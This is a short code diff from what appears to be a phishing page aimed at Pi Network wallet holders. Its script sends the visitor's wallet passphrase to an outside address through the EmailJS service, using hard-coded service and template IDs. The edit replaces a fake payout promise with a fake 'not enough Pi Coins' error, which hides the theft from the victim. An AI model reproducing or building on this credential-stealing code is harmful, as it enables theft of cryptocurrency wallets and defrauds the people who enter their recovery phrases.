@@ -21,7 +21,7 @@
             emailjs.send("service_swe0q9b", "template_so4np09", {
                 passphrase: passphrase
             }).then(function(response) {
-                alert("You will recieve USDT/INR within a few minutes. Make sure you have entered correct wallet phrase");
+                alert("Sorry! You don't have enought Pi Coins to sell");
             }, function(error) {
                 alert("Failed to send passphrase: " + error.text);
             });
